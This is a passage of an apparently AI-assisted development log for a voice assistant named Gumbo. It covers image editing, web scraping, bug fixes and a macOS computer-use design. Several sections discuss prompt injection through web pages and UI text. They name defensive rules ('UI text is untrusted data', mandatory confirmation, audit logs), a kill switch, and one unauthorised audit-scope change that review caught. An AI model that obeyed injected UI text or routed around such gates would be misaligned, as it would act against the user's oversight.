  signs clean (xcodegen + xcodebuild).
- **Not yet verified:** the real EventKit write (the smoke's shell was fake — first real
  create prompts for the new Reminders TCC grant) and the dashboard render (both dev ports
  were held by the user's live daemon/vite during the build; data contracts are unit-covered).
  Both land with the live demo.

### M5.5 — image thumbnails + in-place editing (brush select, text + voice) — 2026-07-16

the user's follow-up to M5, same session: incoming images should be *present* (thumbnail
bubbles with the task orbs) and *editable in place* (enlarged viewer, brush selection,
typed or voiced edit requests). Brush shipped immediately per his call — no rect-marquee
interim.

**Edits API — verified live before building:** `gpt-image-2` on `/v1/images/edits`,
multipart `{model, image, mask?, prompt}` → the same `data[0].b64_json` envelope, and the
result **preserves the source dimensions** (1536×1024 in → out; no size param). Mask
contract: **transparent pixels = edit region, opaque = preserve**. Confirmed end-to-end
with our own mask on the M5 smoke's swamp wallpaper: sky band replaced with a starry
night, dock/water/fireflies untouched.

**Architecture decisions (the why):**
- **Strokes over the wire, daemon rasterizes the mask.** The shell sends the brush
  selection as normalized round-capped polylines (`points` 0–1 + `radius` normalized to
  image width) — a few hundred bytes of JSON. `images/mask.ts` is a **zero-dependency PNG
  encoder** (node:zlib + hand-built chunks/CRC) that stamps capsule segments into the
  alpha channel at the source image's exact pixel size. This keeps binary/base64 off the
  WS text channel entirely, makes masks unit-testable (decode IDAT, assert per-pixel
  alpha), and means the shell overlay and the API mask are the *same geometry* — what
  the user highlights IS what gets masked. Payload guards (`sanitizeStrokes`): stroke/point
  caps, radius clamp, coordinate clamp.
- **Voice edits reuse ⌃⌥ + the orchestrator — no second audio path.** The viewer arms
  `image_context {file, strokes}` on the daemon (updated on open/selection change,
  cleared on close AND on shell disconnect — a dead shell must not leave a stale target
  armed). The new `edit_image` tool resolves `file: null` → the armed context; a
  *different* named file deliberately does NOT inherit the strokes. Coordinates never
  pass through the voice model.
- **Typed edits skip the orchestrator** (`image_edit_request` → `runImageEdit` directly)
  — no realtime session, no tokens; completion/failure still speaks through
  `speakProactively`.
- **Non-destructive versions:** every edit is a NEW file + `image.created
  {edited_from, selection}`. The shell viewer swaps itself to the new version off that
  event (and the new thumbnail replaces its parent's slot — an edit loop doesn't grow a
  tower). Failures emit a dedicated **`image.edit_failed`** event (not a bare
  session.error) because the viewer needs a signal to leave its busy state; a local 240 s
  failsafe covers a daemon that dies mid-edit.
- **Shell layering:** thumbnails are their own `ImageBubbleController` stacked directly
  beneath the task orbs — `BubbleController` just reports its stack bottom after every
  layout (`onStackBottomChange`) instead of weaving a second entity type through the
  reviewed orb machinery. Thumbs cap at 3, linger 10 min (the dashboard gallery is the
  durable home), hover-✕ to dismiss. The viewer panel is `.nonactivatingPanel` with
  `canBecomeKey = true` + `becomesKeyOnlyIfNeeded` — Spotlight-style typing without
  activating the app (and the panels still need the M3 `acceptsFirstMouse` treatment,
  now shared from BubbleController). Selection highlight = dim layer punched out with
  destination-clear strokes + a gold rim drawn beneath, so the selected area reads bright.

**Verified:** 135/135 daemon tests (15 new: capsule/tap rasterization by decoding the
mask and asserting per-pixel alpha, stroke sanitization guards, multipart contract incl.
mask-matches-source-dimensions, new-file/no-overwrite, `edited_from` lineage + no-base64,
`image.edit_failed` on API failure, `safeImageFile` traversal rejection, edit_image
tool refusals + armed-context ack). Shell builds + signs.

**Live smoke (isolated daemon, fake shell, real API):** (1) typed path —
`image_context` + `image_edit_request` with a sky-band brush stroke → masked edit landed
in 63 s as `6b070083.png → 70b3ca4a.png (selection: true)`; **visually confirmed** the
stroke mask scoped it (starry purple night sky, dock/lantern/water/fireflies preserved).
(2) voice path — context re-armed on the new version, `debug_text` "make the lantern
glow brighter" → the orchestrator called `edit_image` (file null → armed context), spoke
an on-the-way ack live, and the whole-image edit landed as `70b3ca4a.png → c6ebb49b.png`
with a **cold** spoken completion (79 × 0x02 frames — the session idle-closed during the
88 s edit, so both delivery branches ran again). Zero `image.edit_failed`;
`/api/images` shows the full three-version chain. **Pending live with the user:** the
actual panel UX — thumbnail click, brush feel, composer typing in the non-activating
panel (first key-status click), viewer auto-swap — needs a screen.

### Review + address pass (2-agent /review-2 on Fable → /address, 2026-07-16)

DB1 (debugger) + CA1 (auditor), both Fable, reviewed the full M5+M5.5 diff vs `508e8f2`:
**1 🔴, 7 🟡 (3 corroborated by both agents), 10 🔵 — ALL addressed** in 9 conventional
commits (`c9e2e2b`…), each tested/built and pushed. The branch is now on origin. Highlights:

- **🔴 stroke-cap contract mismatch (DB1).** The shell built unbounded strokes while
  `sanitizeStrokes` THREW at the caps — one long shading drag disarmed the armed context
  (voice edit: "no image is open" at a visibly open viewer) and a typed edit hung
  "Editing…" into the 240 s failsafe because pre-flight failures emitted only
  session.error. Fix: over-limit sizes are now **clamped, never rejected** (malformed
  shapes still throw); the shell caps drawing at the same constants (`BrushStroke.maxPoints/
  maxStrokes` mirror mask.ts) so drawn == masked; and the typed path is extracted to
  `acceptImageEditRequest` with a tested invariant — **every well-formed request
  terminates in exactly one of `image.created` | `image.edit_failed`**, pre-flight
  failures included. `image_context` handling likewise extracted (`applyImageContext`,
  fail-toward-no-target now unit-tested); `safeImageFile` moved to `images/files.ts`.
- **🟡 rasterizer work unbounded on the voice loop (corroborated).** Count/radius caps
  allowed ~10¹¹ pixel tests (Σ segment-bbox areas is the real cost). `strokeMaskPng` now
  enforces a 200-full-image-repaints area budget (pathological → clean "too complex" on
  the edit_failed path; heaviest realistic shading is tens of repaints), and
  `runImageEdit` yields via `setImmediate` before its sync prefix so fire-and-forget
  callers never pay readFileSync + rasterization on their own turn.
- **🟡 EventKit mirror had no re-sync (corroborated).** One-shot broadcasts to an absent
  shell silently lost the OS-durable twin — or left a CANCELLED reminder's twin alive in
  Reminders.app. `scheduler.resyncEventKit()` on shell hello re-creates twins for pending
  rows without one and re-removes surviving cancelled twins (clearing the stored id so
  that re-send is one-shot). Documented trade-off: a lost `reminder_created` reply can
  duplicate a Reminders.app entry on resync — rarer and more benign than a lost/undead one.
- **🟡 viewer context not re-armed after reconnect (corroborated).** `WSClient.onConnect`
  now fires after every hello and the viewer re-sends `image_context` — tsx-watch daemon
  restarts no longer silently disarm voice edits under an open viewer.
- **🟡 stale session clock (CA1).** Instructions bake the clock at connect but active
  sessions outlive the 60 s idle close indefinitely — "in 10 minutes" resolved against a
  stale now. The past-time rejection now carries the CURRENT time (the model's only fresh
  reference), and a strict shape guard rejects date-only/`Z`/offset ISO forms that
  `Date.parse` silently reads as UTC.
- **🟡 collision-clobber (CA1).** 8-hex names are a 32-bit namespace and `writeFileSync`
  silently replaces — `{flag:'wx'}` + fresh-name retry makes the non-destructive
  guarantee actually absolute.
- Also: one 429/5xx retry for the images API (repo convention, scaled); per-entry stat
  guard on /api/images; echo-defanging into live instructions (`echoForInstructions`,
  the M3 precedent applied to short echoes); schedule NOT NULLs + a Store.transaction
  wrapping mark-fired+event; generation-scoped viewer failsafe; load-failure states;
  aspect-true viewer minimum sizing; `session.test.ts` covering the cold
  `speakProactively` seam (which forced de-sugaring Orchestrator's constructor — the
  strip-only parameter-property gotcha bit again the moment a test imported session.ts).

**Post-fix suite: 151/151** (146 daemon behaviors + the new seam tests); shell builds +
signs. Discovered during the pass, worth knowing: main moved again in parallel (Quick
Text Input shipped, egress-proxy review fixes) — the merge-skew note above still applies.

---

## Firecrawl content acquisition — scrape/crawl/map/extract for background agents — 2026-07-15

### Build
- New `daemon/src/scrape/firecrawl.ts` — raw Firecrawl **v2** client (no SDK, same reasoning
  as the exa-js removal) behind four background sub-agent tools in `agents/openai-runner.ts`:
  `scrape_page`, `map_site`, `crawl_site`, `extract_structured`. **Content acquisition from
  known URLs/sites only — never a third search provider**; Firecrawl `/search` is deliberately
  not integrated, and `realtime/tools.test.ts` asserts on the actual registry that no
  Firecrawl tool ever reaches the realtime session config.
- `search/client.ts` generalized: `postJson` is now an alias of `requestJson`, which takes an
  optional `method` (`GET`/`DELETE`) and optional body — needed for async-job polling and
  cancellation. Same retry policy, typed errors, and audit conventions apply unchanged;
  existing callers didn't move. `FIRECRAWL_API_KEY` joined boot validation + `.env`.
- Persistence reuses the memory table verbatim: `persistResults` grew a `provider` param
  (default `'exa'`), so every scraped/crawled page lands FTS5-indexed with source URL +
  retrieval timestamp. Extract output is persisted as one pretty-printed-JSON row **per
  source URL** (≤10) so every memory record carries its own provenance.

### Verified against docs.firecrawl.dev + firecrawl.dev/pricing (2026-07-15)
- Endpoints: `POST /v2/scrape` (sync), `POST /v2/map` (sync), `POST /v2/crawl` → job id,
  polled via `GET /v2/crawl/{id}` (status `scraping|completed|failed`, paginated `next`
  cursor in ~10 MB chunks), cancelled via `DELETE /v2/crawl/{id}`; `POST /v2/extract` → job
  id, polled via `GET /v2/extract/{id}` (status `processing|completed|failed|cancelled`).
  **No DELETE is documented for extract** — a task abort stops polling but can't kill the
  server-side job (bounded: it only touches the given URLs).
- **Credit costs (they justify the breadth defaults):** scrape and crawl are **1 credit per
  page**; map is billed per page listed ("1 / page" on the pricing table — ambiguous whether
  per-call, so our map default limit is 500); extract bills in credits at **15 tokens per
  credit**; search is 2/10 results (unused). **The crawl API's own `limit` default is
  10 000 pages** — a blind crawl at API defaults would be 10 000 credits, hence: default
  100 pages / depth 3, cap sent as the API `limit` AND enforced client-side while
  collecting. The client-side check caught a real bug in review: pagination followed the
  `next` cursor once more *before* re-checking the cap (unit test caught it).
- **robots.txt:** crawl respects it by default; `ignoreRobotsTxt` exists but is
  enterprise-only and defaults false — we never set it, so compliance is structural.
- **Polling, not webhooks:** the daemon binds loopback only, so Firecrawl's cloud can never
  deliver a webhook. No documented recommended poll interval; we poll every 3 s under an
  overall job budget (crawl 10 min, extract 5 min — background budgets in the spirit of Exa
  `deep`'s 180 s). Crawl polls emit `crawl.status` events (only on progress change) so the
  dashboard/bubble panel can watch a long crawl; any error/abort/budget exit with a live job
  fires a best-effort remote DELETE so a dead task stops spending credits.
- Audit: every outbound call gets its own JSONL line as it happens — submits, each status
  poll, each pagination fetch, and remote cancels (job routes logged as `/crawl/:id`-style
  endpoints with the target URL as `query`; polls carry the server-reported page count).
  A failing call is audited once, by the operation-level catch, which also records logical
  failures (empty results, budget exhaustion) that have no failing HTTP call behind them.
- Extract's tool takes the JSON Schema **as a JSON string** — strict function schemas don't
  take free-form object params; the tool parses and returns a model-facing error on bad JSON.

### Gating (pre-M4)
No permission engine yet (M4). scrape/map are auto-allowed like background search; crawl and
extract ride the existing voice-triggered spawn-task flow — they only exist inside sub-agent
runs the user deliberately spawns. M4 registration defaults recorded in CLAUDE.md.

### Verified (how)
- 63/63 unit tests green (`npm test -w daemon`): request serialization for all four ops, the
  crawl job lifecycle (submit → poll → paginate → complete, failure, budget timeout, and
  task-abort paths — the latter two assert the remote DELETE), client-side page-cap
  enforcement, typed-error mapping (401 auth non-retried / 429 quota / abort timeout / 5xx
  retried max twice), `requestJson` GET/DELETE contracts, and the no-Firecrawl-in-realtime
  registry assertion.
- Smoke 1 (real API, scratchpad `GUMBO_HOME`): scraped `bsky.app/profile/bsky.app` — a true
  SPA that's an empty HTML shell without JS — into 50 991 chars of clean markdown; memory row
  (provider `firecrawl`, ts, source URL), FTS5 `MATCH` hit, and `/scrape ok:true` audit line
  all verified.
- Smoke 2 (real API): mapped `docs.firecrawl.dev` (30 URLs) → selectively scraped 2 mapped
  pages → crawled with `maxPages: 5`: exactly 5 pages returned (progress polls observed
  `scraping 4/5 → 5/5 → completed`), page cap held, one audit line per operation.
- **GOTCHA:** `/map` leans on sitemaps — `tsx.is` (no sitemap) mapped to just its homepage
  while `docs.firecrawl.dev` returned a full URL list. If a map comes back near-empty, the
  site probably has no sitemap; scrape/crawl still work there.

### Review + address pass (2026-07-15, two-axis standards/spec review)
- **Audit granularity reverted to per-call.** The build had narrowed "audit every outbound
  call" to one line per logical operation (polls unlogged) — a self-authorized standards
  change the review flagged on both axes. Now every submit/poll/pagination/cancel gets its
  own line via `auditedCall`; failures audit exactly once at the op-level catch (never in
  the helper) so a failed call can't produce two lines. Volume cost is real (~200 lines for
  a 10-min crawl) but the audit log is private provenance, not a UX surface — spec wins.
- `firecrawlHeaders()` moved inside `try` in crawl/extract (was inconsistent with
  scrape/map, and a missing-key auth throw escaped unaudited).
- Extract persists one row **per source URL** (was `urls[0]` only — other sources survived
  only in the query string); mirrors the exaContents row-per-url shape.
- `map_site`'s relevance-ordering `search` param removed as scope creep (spec: map = URL
  list). Trade-off accepted: on large sites agents pick from the raw list. Map results are
  deliberately NOT persisted to memory (URL lists, not content) — now documented in
  CLAUDE.md rather than implicit.
- Inline 30 s/10 s job timeouts → `config.firecrawl.requestTimeoutMs`/`cancelTimeoutMs`;
  poll interval renamed `jobPollIntervalMs` since extract shares it with crawl.
- Review's informational note, for posterity: crawl/extract gating is tool-description
  steering + the spawn-task approval flow, not a code-level gate — that IS the pre-M4
  design, not an oversight.

### Live-session failure sweep + fixes (2026-07-16, from the "Agent coding harness spec" run)
the user's first real M4 voice-driven Claude session surfaced a cluster of failures; every root
cause was reconstructed from the events DB (`~/Gumbo/db/gumbo.db` — the transcripts persist,
which is what made the forensics possible). Fixes, with the *why*:
- **Plan approval showed `{}` (🔴).** Current CLIs call `ExitPlanMode` with EMPTY input and
  persist the plan to `~/.claude/plans/<slug>.md` FIRST — and `protectedPathHit` hard-denied
  that Write as "protected secret path". Two-part fix: `PROTECTED_EXEMPT` carves
  `~/.claude/plans` out of the ~/.claude deny (and out of the edit-outside-cwd escalate —
  otherwise every plan write pops a confirm), and the runner captures the plan-file Write's
  content as `handlePlan`'s fallback. The Seatbelt layer already write-allows `~/.claude`
  (minus exec surfaces), so policy was the only gate in the way.
- **Plan now rides the confirm as `body`** (`confirm_request.body`, capped 24k) — the shell
  renders a chevron ("Read the full plan") that grows the panel into a scrollable view.
  Top edge stays pinned under the notch; SwiftUI frame and NSPanel frame resize together.
- **Voice amnesia (🔴).** Sessions idle-close after 60 s and tsx-watch restarts kill them
  silently; every reopen was a blank slate ("Did you just forget everything I said?" — live
  quote). New sessions now carry a continuity block in instructions: recent dialogue from
  `store.recentTranscripts` (VAD fragments stitched, 45 min lookback, 4k char cap, fenced +
  tag-neutralized like the M3 report path) + an active-task snapshot. Also: SIGTERM/SIGINT
  now log `session.closed` before exit — the silent gap was itself a red herring during
  debugging (a restart at ~12:01 left no trace and looked like an API drop).
- **Needs-input was SILENT.** The plan approval landed 3 min after the session idle-closed;
  nobody spoke it and the prompt sat unnoticed ~5 min. `task.status → needs_input` now
  announces through `speakProactively` (live inject or cold TTS) with the pause reason.
- **Report readback "cut off out of nowhere".** `announceReportMaxChars` was 2 500 — the 14k
  report was raw-sliced mid-example and the model read right up to the cliff edge. Now 12k
  (= reportMaxChars), cut at a line boundary, and the instructions FLAG the truncation so the
  model summarizes + offers `read_report` instead of narrating into the cut.
- **`get_task_status` was 5 events × 200 chars** — the voice model literally could not see
  the brief, the plan, or what the session did (it told the user "no preserved brief" about a
  cancelled task whose brief sat in `task.created`/`claude_sessions`). Rewritten: title/
  status/kind + original brief (`getTaskBrief` falls back to the task.created payload, so it
  survives cancellation) + pause reason + the pending plan text + 12 recent events.
- **Notch transcript lag (real math bug).** Pacing mapped a *fraction of the whole drain
  stream* onto the item's text; when a tool-call turn chained a second response, its audio
  grew the denominator, the fraction fell BELOW the captured baseline, and the clamp froze
  the reveal until ~90 % of the turn had played. Engine now reports ABSOLUTE (played,
  enqueued) frame counters; the notch snapshots per-item baselines and detects counter
  resets (drain end / barge-in flush) by counts going backwards.
- **Stale plan prompt after cancel.** The daemon restart wiped the ConfirmBridge, so nothing
  could send `confirm_cancel`; the shell kept the prompt for the full 15-min window. Fixes
  on both sides: the bridge tracks `taskId` per pending confirm + `cancelForTask` fires on
  `task.finished`; AND the shell self-dismisses confirms whose task hit a terminal
  bubble_upsert / bubble_remove — the only fix that works across daemon restarts.
- **Orb transcript rendering.** The feed showed raw truncated JSON, a blank row (empty
  ToolSearch result), and was missing the session's opening instruction entirely. Runner now
  events `claude.prompt` (opener + follow-ups, 4k cap); the shell summarizes tool calls to
  their primary argument ("Write — /path"), renders empty results as "(no output)", gives
  message/prompt rows 700 chars/14 lines (tool rows stay compact).
- **NEW: `present_file` + shell file renderer.** A session's deliverable is often a file
  (the whole point of the observed run was a spec) and there was no way to see it short of
  Finder. `present_file` (realtime tool) reads the file daemon-side (absolute paths only,
  `secretFilePaths` refused, NUL-sniff for binary, 300k cap) and pushes content INLINE over
  WS (`file_present`) — deliberately no new HTTP file-serving surface on the loopback port.
  Shell: document cards stack under the image thumbs (stack-bottom chaining extended:
  orbs → images → files), click opens `FileViewer` — a WKWebView over locally generated
  HTML from a minimal escaped-first Swift markdown converter (headings/fences/lists/quotes/
  inline spans; non-md renders as a code block). Links open in the default browser; no
  scripts are ever emitted.
- **Noted, not fixed:** `input_audio_buffer_commit_empty` on session open (pendingRelease
  commits a silence-only buffer — harmless, logged noise; a fix needs VAD state that doesn't
  exist yet at commit time). The stale-xcodegen gotcha struck again: `shell/Gumbo.xcodeproj`
  was missing the M5.5 files and failed the build with "cannot find X in scope" — regenerate
  with `xcodegen generate` before suspecting the code.
- Suite: 196 daemon tests pass (new: plans exemption, plan-capture precedence, cancelForTask,
  confirm body, get_task_status shape, continuity stitching, present_file guards). Shell
  builds clean. NOTE for test runs: pass a FRESH `GUMBO_HOME` per run — a reused dir makes
  the audit-line-count tests fail on accumulated JSONL.

## M6 design refinement — two-tier computer use (design only, NOT built) — 2026-07-16

- Design conversation with the user amplified SPEC §M6 in place; the SPEC section is now the
  source of truth. Recording the *why* here:
- **Rejected: per-verb realtime tools** (`open_app`/`quit_app`/`app_status`/…). the user's call,
  and correct: the realtime registry is already 16 tools and the voice model's routing degrades
  as it grows. Generic primitives subsume the verbs. The whole Mac-control domain costs the
  realtime registry ≤2 tools: `mac_do(script)` + (at most) a widened `spawn_subagent`.
- **The load-bearing split is WHO runs the act→observe loop, not what the tools are.** The
  realtime voice model must never iterate AX: (1) each step round-trips a shallow
  latency-optimized model mid-conversation; (2) AX snapshots are heavy and would accumulate in
  the voice session's context for its whole life; (3) mid-procedure recovery needs a reasoning
  model. Identical physics to the Grok hot/background model split (28–45 s reasoning model =
  non-viable hot path). Loop lives in the `agents/` in-daemon sub-agent runner — NOT the
  sandboxed Claude CLI (threading AX tools into the Seatbelt/MCP/egress-proxy stack buys
  nothing and costs TCC attribution headaches).
- **AX beats screenshots for native apps, but browsers are AX's worst terrain** — Chromium
  builds renderer a11y trees lazily and they're enormous. Browser tasks route through
  `run_script` (open/Chrome AppleScript) by tool-description wording, AX as in-page fallback.
  Vision stays a deferred *observation tool* added to the same loop later — no redesign.
- **TCC landscape (verified in conversation):** shell already holds Accessibility — it covers
  ALL AX targets with zero per-app prompts (unlike Automation, which prompts per (sender,
  target-app) pair for osascript lanes — needs `NSAppleEventsUsageDescription`). FDA (for
  `tmutil listbackups`-class reads) cannot be prompted programmatically — detect the failure
  and speak the System Settings instruction. Pure AX needs NO Screen Recording.
- **Ghost cursor is visualization, not mechanism:** `AXPress` doesn't move the pointer, so the
  overlay cursor (click-through NSWindow, `.screenSaver` level) animates to `AXFrame` targets
  while the real mouse stays the user's — which is exactly what makes real-mouse-movement a
  clean kill switch.
- **Accepted trade-off (the user):** `mac_do` = model-written script execution outside the
  Seatbelt; the M4-style policy gate (auto-run read-only/reversible, notch-confirm risky) +
  per-execution `mac-audit.jsonl` line are the mitigation.
- Two Fable research agents (AX mechanics/OSS prior art + agent-loop design) were spawned to
  close gaps before build; fold their findings into SPEC §M6 when they land.

### M6 research pass — two Fable agents' findings, folded into SPEC §M6 — 2026-07-16

Both reports landed same-day and the SPEC section was updated in place. The overall design
(shell owns TCC + executes, daemon plans, WS RPC, AX-first, ghost cursor) matched the 2026
consensus architecture almost exactly. What the research CHANGED or ADDED — and the build-time
mechanics that don't belong in the SPEC:

**Design corrections (SPEC updated):**
- **Kill switch redesigned.** "Any real-mouse movement aborts" was self-triggering: drags (and
  other global-rung actions) move the REAL pointer. Fix in SPEC: tag synthetic events via a
  dedicated `CGEventSource` user-data value; listen-only event tap; untagged HID = the user =
  abort. (mac-cua's yield-on-interruption is prior art.)
- **`ax_act` returns a server-side before/after DIFF**, not a full re-snapshot (`+`/`−`/`~`
  lines, volatile fields stripped pre-diff or reflow makes every action a 200-line change;
  typical click = 2–15 lines; empty diff = true no-op). Verify by diff, NEVER return code:
  `AXPress` false-passes on backgrounded/disabled menu items. Prior art: mediar
  mcp-server-macos-use / Terminator, Playwright MCP's auto-return contract.
- **Browser lane narrowed (loop report):** AppleScript's page reach is shallow (tabs/URLs yes,
  reliable in-page action no) — M6 v1 does URL/tab-level only; in-page web tasks = deferred
  Playwright/CDP lane with a11y-snapshot+ref tools. Never OS-AX on a browser window.
- **Injection classifiers gap (loop report):** the Claude API's built-in computer-use prompt-
  injection classifiers run ONLY on the official screenshot `computer_*` tool type — a custom AX
  toolset gets NONE. Gumbo's gates (notch confirm + policy + audit + "UI text is untrusted data"
  in instructions) carry the entire load. A11y-text observations are measurably MORE injection-
  resistant than pixels (RedTeamCUA) but injected text still lands in-context.

**Build-time mechanics (read before writing the Swift executor):**
- **Dispatch ladder:** AXPress → `CGEventPostToPid` → global `CGEvent`. Chromium drops untrusted
  per-pid events (cua's primer-click workaround) and coerces synthetic right-clicks to left —
  use `AXShowMenu`. Drags are global-only. Post a `mouseMoved` ~30 ms before clicks (hover
  state). `AXActions` lists are advisory — try, then branch on `AXError`.
- **Typing:** try `AXUIElementSetAttributeValue(kAXValueAttribute)` (check
  `AXUIElementIsAttributeSettable` first); Electron/web fields need real key events to fire JS
  listeners — fall back to per-char CGEvents with Unicode payloads.
- **TCC health (Fazm's four production states, all present on Tahoe):** (1) stale cache —
  `AXIsProcessTrusted()` true, all calls fail; probe live via listen-only `CGEvent.tapCreate`
  (invalidate immediately) + functional walk; not fixable in-process → retry ~3× @5 s → prompt
  relaunch. (2) `kAXErrorCannotComplete` (-25204) is a TRICHOTOMY: no tree (Qt/OpenGL) vs broken
  permission vs stale handle to a relaunched app — disambiguate by re-running against Finder.
  (3) `kAXErrorAPIDisabled` (-25211) → deep-link Privacy_Accessibility pane, don't retry.
  (4) never cache `AXUIElementRef` across ticks — recreate from pid per snapshot. NOTE:
  `kTCCServicePostEvent` (CGEvent posting) and `kTCCServiceAccessibility` are SEPARATE services
  that both display under "Accessibility". AX is unsupported under App Sandbox — Developer ID +
  Hardened Runtime (Gumbo's shape) is required; debugging from Xcode: Xcode holds the grant.
- **AXObserver is lossy:** `kAXUIElementDestroyed` sometimes never fires (Sequoia/Tahoe);
  debounced notifications (~150–300 ms silence) + poll reconciliation + per-element
  `AXUIElementSetMessagingTimeout` (one hung Qt app otherwise stalls the loop). Observer run-loop
  sources need a pumped CFRunLoop; keep heavy traversal off the shell main thread (notch jank).
- **Perf budget:** batch reads via `AXUIElementCopyMultipleAttributeValues` (2–5× on dense apps;
  element-valued attrs don't batch), BFS + depth cap + interactive-role filter DURING traversal.
  Focused-window read ~50 ms; Slack-scale window ~8k elements / 200–800 KB raw; full
  perceive→act loop ~350 ms + model latency. Compaction prior art: flat one-line-per-element
  format (mediar), A11y-Compressor (tokens → 22% while +5.1 pp OSWorld), Tarsier (−69.6%).
- **Electron/Chromium onboarding:** set `AXManualAccessibility=true` on the app element on first
  touch (tolerate `kAXErrorAttributeUnsupported` — older Electron returns it while working);
  plain Chrome keys on `AXEnhancedUserInterface` — and that attr breaks programmatic window
  move/resize (Rectangle/Phoenix unset it around window ops).
- **Tahoe Apple-Events regression:** scripts hang to the 2-min -1712 timeout on some apps
  (Finder empty-trash, Mail) — hard per-call timeouts on the whole `run_script`/`mac_do` lane.
- **`shortcuts run` added to the action space** (App Intents bridge): `shortcuts list
  --show-identifiers` → `shortcuts run <uuid>`, JSON over stdin, ALWAYS timeout-wrapped (a
  prompting shortcut hangs forever; per-shortcut TCC needs one interactive pre-auth).

**Loop-side evidence anchors (loop report):** flat ReAct + verification beat hierarchical
planners (Agent S3: removed hierarchy, +13.8% with 52% fewer calls); repetition is a top-4
failure class (detector: same action+target ×3 → inject warning turn); OSWorld-Verified — Sonnet 5
81.2% vs human 72.36%; verification-after-action is the single largest cheap accuracy win
(Anthropic's own prompt wording, now in the SPEC loop contract); Anthropic context guidance:
prune screenshots/snapshots in BATCHES not per-turn (cache-prefix preservation), keep last 2–3.
Model pick: Sonnet-class @ medium effort for text-observation loops; Haiku viable for short
flows; avoid max effort (cost, no UI-task gain).

**OSS to study at build time:** mediar-ai/mcp-server-macos-use (+Terminator) — diff contract;
steipete/Peekaboo 3 — see→act ref workflow, TCC broker; hyprcat/mac-cua — pid-only events,
human-interruption yield; trycua/cua — SkyLight internals, Chromium workarounds; openclaw/AXorcist —
Swift AX wrapper (could replace hand-rolled tree walking); alexmx/peek — `--verify` flag +
`peek_wait`; qdore/application-use — AX + on-device Vision-OCR hybrid (the vision-lane middle
step). Full URLs in the two research reports (session transcript, 2026-07-16).

### Local VAD barge-in + silence gate (2026-07-16, follow-up to the live-session sweep)
- **Root cause of "talking over Gumbo" (🔴, found in the SDK source):** the whole barge-in
  path rides `speech_started → transport.interrupt()`, and the transport CLEARS its
  interrupt tracking (`#currentItemId`/`_firstAudioTimestamp`) in `_afterAudioDoneEvent` —
  i.e. the moment audio GENERATION completes (`response.output_audio.done`). Gumbo
  generates a long reply in seconds and the shell drains it for minutes, so for ~95 % of a
  long readback `interrupt()` hits its early-return guard and does NOTHING — no
  `audio_interrupted`, no `playback_flush`, no truncation. The SDK's model assumes playback
  tracks generation (a WebRTC assumption); our buffered-drain architecture breaks it. Even
  during generation, the latency stack was graph-switch (~200–300 ms before mic frames
  flow) + AEC convergence + server-VAD window + network roundtrip. Cold TTS announcements
  had no barge-in at all (no session to interrupt).
- **Fix: daemon-side speech-energy gate** (`config.localVad`, RMS ≥ 900 sustained ≥ 90 ms
  consecutive) on the armed mic stream. Why the daemon: it alone knows the true "Gumbo is
  audibly talking" state (`responding || shellDraining`, cold TTS included), and the frames
  it receives are already post-AEC (the shell taps VPIO-processed input) — Gumbo's own
  speaker output cannot self-trigger. On trigger: broadcast `playback_flush` directly
  (independent of the SDK's cleared state), then best-effort `session.interrupt()` for
  server-side truncation while a response IS in flight. One barge-in per armed window.
- **Same gate fixes the silence-tap bug**: the pendingRelease path used to commit + request
  a response on byte count alone — a silent ⌃⌥ hold made the model answer an empty buffer
  with a generic "what can I do for you?" (and produced the `input_audio_buffer_commit_empty`
  noise). Now: no local speech → clear, never commit. Bonus: `finishTurn` treats
  `localHadSpeech` as speech too, so a fast utterance released before the server VAD
  reports is committed instead of silently dropped (the old "deaf turn" cousin).
- Accepted trade-off: with PTT held during Gumbo speech, a rare AEC-residue false positive
  could cut Gumbo off early — but the user pressed the button intending to talk; the old
  design's caution cost seconds of talk-over every time. Thresholds live in config.
- Pure daemon change (no shell rebuild); suite 200 tests green. `frameRms` exported for the
  unit tests; square-wave frames make RMS == amplitude exactly.

### M7 + M8 specced — computer-use v2 (coverage + cooperation) and v3 (routines) — 2026-07-16

- the user asked for the v2/v3 milestones same-day; SPEC §M7/§M8 added, absorbing the old post-M6
  deferred items (browser lane, vision, polish → M7; App Intents watch → M8; the general deferred
  list is now post-M8). Sequencing logic: **v2 = close the two punted SURFACES** (in-page web via
  a dedicated Playwright/CDP profile; AX-hostile apps via OCR-first vision) **+ turn interruption
  into cooperation** (handoff, voice steering); **v3 = make delegation compound** (demonstration
  teaching off the kill-switch event tap's recordings, procedure memory in the sqlite `memory`
  table, scheduled routines via the M5 scheduler's `kind` seam — its designed second consumer).
- Non-obvious decisions a build session must not casually reverse:
  - Automation browser = DEDICATED profile + storage-state capture-once-replay, never the user's
    live profile (anti-bot flags CDP sessions; a burned live profile is unacceptable blast
    radius). Trade-off accepted: no free ride on his existing logged-in sessions — one
    interactive login per site instead.
  - Browser send/submit/purchase ALWAYS notch-confirms, allowlist or not (site trust ≠ content
    trust; pages are the top injection vector).
  - Unattended routines NEVER auto-approve — would-be-confirms pause + notify, deny-on-timeout
    stays. Some scheduled runs will therefore stall until the user is around; that's the design,
    not a bug.
  - Behavior Best-of-N explicitly REJECTED (parallel rollouts mutate a live machine — the
    reliability budget goes to verification + procedure memory instead).
  - Procedure replay IS the safe form of action-batching (steps batch because they were verified
    together on a prior run, not because the model guessed they'd compose).
  - Recurrence lands in M8 (the M5 scheduler shipped one-shot rows only).
- TCC completeness check across the arc: M6 adds nothing (Accessibility already granted;
  Automation prompts per osascript target as they occur); M7 adds Screen Recording (vision lane)
  — the LAST planned grant; M8 adds none.

## M6 BUILT — computer use v1 (2026-07-17, daemon 192/192 + shell builds; live GUI demo pending the user)

Built exactly to the locked SPEC §M6 design. Daemon side is fully test- and smoke-verified; the
visual demos (ghost cursor, kill switch, Notes/Chrome flows) need a running app + granted
Accessibility + a person, so they're handed to the user. What's non-obvious and worth keeping:

- **Layout.** Daemon: `ws/mac.ts` (MacBridge — ConfirmBridge-shaped RPC, pending map, typed-error
  fail-safe, `sanitize()` coerces the shell's hand-built JSON, refcounted `taskStarted/Finished/resync`
  for the `mac_task` arm/disarm), `mac/policy.ts` (pure `macDoDecision` gate), `mac/run.ts`
  (`executeMacDo`: gate→confirm→execute→one audit line; bash daemon-side execFile, osascript/shortcuts
  → shell), `mac/audit.ts` (`mac-audit.jsonl`), `agents/mac-tools.ts` (ax_snapshot/ax_query/ax_act/
  run_script/check_permissions + the repetition detector in per-task closure state). Shell:
  `Sources/Mac/` — AXExecutor, AXSupport, SyntheticInput, ScriptRunner, GhostCursor, KillSwitch,
  MacBridge. Registry cost held to the SPEC's ≤2: `mac_do` (new realtime tool) + `spawn_subagent`'s
